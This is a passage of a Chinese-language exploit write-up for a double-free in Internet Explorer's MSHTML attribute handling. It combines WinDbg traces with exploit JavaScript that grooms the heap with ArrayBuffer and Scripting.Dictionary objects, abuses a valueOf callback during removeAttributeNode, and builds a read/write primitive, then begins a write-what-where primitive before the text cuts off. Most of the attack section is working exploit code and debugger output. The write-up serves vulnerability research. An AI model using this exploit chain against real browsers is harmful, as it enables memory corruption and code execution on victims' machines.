<p>因此下断在此直接查看ecx的CElement结构，CElement+0x10处为CAttrArray所在地址，CAttrArray内存储了5个CAttrValue结构，该结构指向的正是elem、attr1 和attr2：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-36-25.png" alt="" /></p>

<p>接着通过调用两次CBase::FindAAIndexNS函数获取了attr1和attr1.ValueOf在CAttrArray中的序号：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-56-15.png" alt="" /></p>

<p>将获取到的CAttr[1]的序号和vtType传入GetObjectAt函数获取CAttr[1]：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-9-52.png" alt="" /></p>

<p>接着调用GetIntoBSTRAt将CAttr[1].ValueOf转化为BSTR：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-12-14.png" alt="" /></p>

<p>执行完后查看CAttrArray发现elem中全部被attr2覆盖，说明在GetIntoBSTRAt函数内执行了attr1的回调函数，调用了clearAttributes将elem内的Attr对象全部释放：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_12-1-37.png" alt="" /></p>

<p>跟进调试发现GetIntoBSTRAt内调用了JavascriptDispatch::InvokeOnSelf，最终调用CElement::clearAttributes把attr1和attr2清除：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-17-52.png" alt="" /></p>

<p>执行完回调函数后会接着执行CAttrArray::Destroy来释放attr1，但是此时CAttrArray数组中被attr2覆盖，执行完毕后attr2从内存中释放：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-20-43.png" alt="" /></p>

<p>当执行到CBase::FindAAIndexNS时，Attr2已经被释放，获取Index时出错返回-1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-23-31.png" alt="" /></p>

<p>因此在执行下一个CAttrArray::Destroy时触发Double Free，会将-1当作Index释放CAttr[-1]的对象，获取了一个非法的对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-36-29.png" alt="" /></p>

<p>因此，要想构造读写原语需要占用被释放后的attr2的内存空间，同时需要向elem中添加Attribute避免CBase::FindAAIndexNS获取到非法的下标。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="构造读写原语">构造读写原语</h2>

<p>构造读写原语部分EXP如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function pad0(str) {
    return ('0000' + str).slice(-4)
}

function alloc1() {
    var view = new DataView(abf)
    var str = ''
    for (var i = 4; i &lt; abf.byteLength - 2; i += 2)
        str += '%u' + pad0(view.getUint16(i, true).toString(16))
    var result = document.createAttribute('alloc')
    result.nodeValue = unescape(str)
    return result
}

function alloc2() {
    var dic1 = new ActiveXObject('Scripting.Dictionary')
    var dic2 = new ActiveXObject('Scripting.Dictionary')
    dic2.add(0, 1)
    dic1.add(0, dic2.items())
    dic1.add(1, fake)
    dic1.add(2, arr)
    for (i = 3; i &lt; 0x20010 / 0x10; ++i)
        dic1.add(i, 0x12341234)
    return dic1.items()
}

var god
var arr = [{}]
var fake = new ArrayBuffer(0x100)	//伪造的write-what-where读写原语
var abf = new ArrayBuffer(0x20010)	
var alloc = alloc2()				//替换ArrayBuffer的Scripting.Dictionary对象结构
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
var ele = document.createElement('element')		//element对象，内有attribute回调函数和attr字符串数组
var att = document.createAttribute('attribute')
att.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        ele.clearAttributes()
        hd2 = hd1.cloneNode()					//执行完该语句，attr字符串已经被替换为ArrayBuffer abf
        ele.setAttribute('attribute', 1337)		//执行该语句是为了让CBase::FindAAIndexNS获取到正确的下标，导致被替换后的attr再次被释放
    }
}
ele.setAttributeNode(att)
ele.setAttribute('attr', '0'.repeat((0x20010 - 6) / 2))
ele.removeAttributeNode(att)	//执行该语句，首先会执行attribute回调函数，接着执行removeAttributeNode
hd0.nodeValue = alloc			//随后将被释放的attr替换为dic1.items
</code></pre></div></div>

<p>下断在jscript9!Js::JavascriptArrayBuffer::Create，执行完毕后查看ArrayBuffer：fake和abf的结构，获得fake和abf的内存布局：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:020&gt; bp jscript9!Js::JavascriptArrayBuffer::Create
breakpoint 0 redefined
0:020&gt; g
Breakpoint 0 hit
eax=00000100 ebx=095b4bc0 ecx=00000100 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
jscript9!Js::JavascriptArrayBuffer::Create:	 	//var fake = new ArrayBuffer(0x100)	
737893d0 8bff            mov     edi,edi
0:009&gt; gu
eax=0963fed0 ebx=095b4bc0 ecx=00000000 edx=00000078 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009&gt; dpp eax L9			//fake的ArrayBuffer结构
0963fed0  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963fed4  08dcc8c0 00000020
0963fed8  00000000
0963fedc  00000000
0963fee0  00000000
0963fee4  00000000
0963fee8  00000000
0963feec  05d4d338 00000000	//+0x1c为Buffer所在地址
0963fef0  00000100			//+0x20为BufferLenth
0:009&gt; g
Breakpoint 0 hit
eax=00020010 ebx=095b4bc0 ecx=00020010 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
jscript9!Js::JavascriptArrayBuffer::Create:	 //var abf = new ArrayBuffer(0x20010)
737893d0 8bff            mov     edi,edi
0:009&gt; gu
eax=0963ff00 ebx=095b4bc0 ecx=00000000 edx=00000008 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009&gt; dpp eax L9	 		//abf的ArrayBuffer结构
0963ff00  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963ff04  08dcc8c0 00000020
0963ff08  00000000
0963ff0c  00000000
0963ff10  00000000
0963ff14  00000000
0963ff18  00000000
0963ff1c  05d61fe8 00000000 //+0x1c为Buffer所在地址
0963ff20  00020010		 	//+0x20为BufferLenth
</code></pre></div></div>

<p>此时在Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b处下断，该函数为对象函数调用处，可以看到hd0，hd1和ele在内存中的布局：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; bp Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b
0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd0 = document.createAttribute('handle')
0:009&gt; p
eax=0a2f9cf0 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 00000008 00000000
05387230  00000000 00000000 05382370 00000000
0:009&gt; du 093b32c4 
093b32c4  "handle"
0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd1 = document.createAttribute('handle')
0:009&gt; p
eax=0a2f9d20 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009&gt; du 093b31e4 
093b31e4  "handle"
0:009&gt; g
Breakpoint 0 hit
eax=0e408092 ebx=00ebd201 ecx=72040490 edx=00040000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createElement (72040490)}	//var ele = document.createElement('element')
0:009&gt; p
eax=0a2f9d50 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L8	//ele
05382b40  715f5670 00000001 00000001 00000008
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009&gt; dd 05378a70 L4		//CAttrArray
05378a70  00000010 00000001 0541f580 00000000
0:009&gt; dd 0541f580 L1*4		//CAtrrValue
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0:009&gt; du poi(05384bc0+8)
093b2fc4  "element"
</code></pre></div></div>

<p>当执行到removeAttributeNode时，ele内已经存放了attribute回调函数和attr字符串数组：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e409f2c ebx=00ebd201 ecx=7204f960 edx=00001000 esi=10000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CElement::Trampoline_removeAttributeNode (7204f960)}	//ele.removeAttributeNode(att)
0:009&gt; dd 05382b40 L8
05382b40  715f5670 00000001 00000001 00000010
05382b50  05378a70 00000000 0a2f9d50 00000000
0:009&gt; dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009&gt; dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc	//elemengt
0541f590  80000901 002dc6c1 09649b84 00000020	//attribute.nodeValue
0541f5a0  80000d09 002dc6c1 053872c0 05cec824	//attribute
0541f5b0  80000801 002dc6c2 0943b5b4 00000020	//attr
0:009&gt; du poi(053872c0+24) 
093b3284  "attribute"
0:009&gt; dd 0943b5b4-4	//attr
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
</code></pre></div></div>

<p>接着在执行removeAttributeNode时，会调用att的回调函数，执行函数alloc1()，将ArrayBuffer：abf复制到hd1.nodeValue：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec068 ebp=05cec0d0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec0b8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var result = document.createAttribute('alloc')
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cebfc0 ebp=05cec024 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec00c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//result.nodeValue = unescape(str)
0:009&gt; g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec1d8 ebp=05cec23c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec224={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec27c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//hd1.nodeValue = (new alloc1()).nodeValue
0:009&gt; dd 05387260 L10	//hd1，此时hd1.nodeValue还未赋值
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  00000000 00000000 05382370 00000000
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec268=05cec240
0:009&gt; dd 05387260 L10	//hd1
05387260  715961ec 00000001 00000001 00000008
05387270  00000000 00000000 0a2f9d20 00000000
05387280  ffffffff 093b31e4 00000008 00000000
05387290  094a200c 00000000 05382370 00000000
0:009&gt; dd 094a200c-4	//abf已经复制到了hd1.nodeValue
094a2008  0002000a 00000000 00000000 00000000
094a2018  00000000 00000000 00000000 00000000
094a2028  00000000 00000000 00000000 00000000
094a2038  00000000 00000000 00000000 00000000
094a2048  00000000 00000000 00000000 00000000
094a2058  00000000 00000000 00000000 00000000
094a2068  00000000 00000000 00000000 00000000
094a2078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>执行完毕clearAttributes后，ele内的元素被清除，attr所占用的内存空间也会被清理，当执行完hd1.cloneNode()后，attr所占用的内存空间变成了hd1.nodeValue，此时获得了hd2.nodeValue这个0x20100大小的读写原语：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e407d10 ebx=00ebd201 ecx=7203e880 edx=40010004 esi=10000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CHTMLElement::Trampoline_clearAttributes (7203e880)}	//ele.clearAttributes()
0:009&gt; dd 05378a70 L4
05378a70  00000010 00000004 0541f580 08954440
0:009&gt; dd 0541f580 L4*4		//此时CAttr中的元素还未被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000901 002dc6c1 09649b84 00000020
0541f5a0  80000d09 002dc6c1 053872c0 05cec824
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//attr所在内存也未被清除
0943b5b0  0002000a 00300030 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009&gt; p
eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=10000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009&gt; dd 0541f580 L4*4		//执行完毕后，CAttr中的元素被清除
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//attr所在内存也被清理，为空闲状态
0943b5b0  09461fd8 093ff588 00300030 00300030
0943b5c0  00300030 00300030 00300030 00300030
0943b5d0  00300030 00300030 00300030 00300030
0943b5e0  00300030 00300030 00300030 00300030
0943b5f0  00300030 00300030 00300030 00300030
0943b600  00300030 00300030 00300030 00300030
0943b610  00300030 00300030 00300030 00300030
0943b620  00300030 00300030 00300030 00300030
0:009&gt; g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}	//hd2 = hd1.cloneNode()
0:009&gt; p
eax=0c565000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
0:009&gt; dd 0943b5b4-4		//attr所占用的内存空间变成了hd1.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>然而如果直接返回到removeAttributeNode，当获取Index时就会发生报错，为了避免这种情况添加了attribute到ele中，这样就能成功获取到序号，执行CAttrArray::Destroy将attr所占用的内存空间释放：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0e30d7e0 ebx=00ebd201 ecx=7186bf00 edx=00000001 esi=10000003 edi=00000003
eip=73869e6b esp=05cec2d0 ebp=05cec338 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec320={MSHTML!CFastDOM::CElement::Trampoline_setAttribute (7186bf00)}	//ele.setAttribute('attribute', 1337)
0:009&gt; dd 0541f580 L4*4
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c2 0943b5b4 00000020
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
0:009&gt; g
Breakpoint 0 hit
eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}
0:009&gt; dd 0541f580 L4*4		//执行完毕整个removeAttributeNode函数后，ele内有两个元素，attr所占内存也被再次释放
0541f580  80000d04 8001141f 05384bc0 05cec4dc
0541f590  80000801 002dc6c1 0945bcbc 08d069d0
0541f5a0  80000801 002dc6c2 0943b5b4 00000020
0541f5b0  80000801 002dc6c2 0943b5b4 00000020
0:009&gt; dd 0943b5b4-4		//hd2.nodeValue
0943b5b0  09461fd8 093ff588 00000000 00000000
0943b5c0  00000000 00000000 00000000 00000000
0943b5d0  00000000 00000000 00000000 00000000
0943b5e0  00000000 00000000 00000000 00000000
0943b5f0  00000000 00000000 00000000 00000000
0943b600  00000000 00000000 00000000 00000000
0943b610  00000000 00000000 00000000 00000000
0943b620  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>读写原语hd2.nodeValue构造完毕，接下来通过hd2.nodeValue构造write-what-where读写原语来实现利用。</p>

<h2 id="构造write-what-where">构造write-what-where</h2>

<p>构造write-what-where读写原语EXP：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">dump</span><span class="p">(</span><span class="nx">nv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x20010</span><span class="p">)</span>
    <span class="kd">var</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">ab</span><span class="p">)</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">nv</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
        <span class="nx">view</span><span class="p">.</span><span class="nx">setUint16</span><span class="p">(</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">nv</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">),</span> <span class="kc">true</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">ab</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">Data</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="nx">type</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">setData</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">abf</span><span class="p">)</span>
    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">type</span>
    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">value</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">flush</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">hd1</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">alloc1</span><span class="p">()).</span><span class="nx">nodeValue</span>
    <span class="nx">hd2</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="nx">hd2</span> <span class="o">=</span> <span class="nx">hd1</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint8</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">16</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint16</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">32</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">return</span> <span class="nx">god</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
        <span class="k">case</span> <span class="mi">16</span><span class="p">:</span>
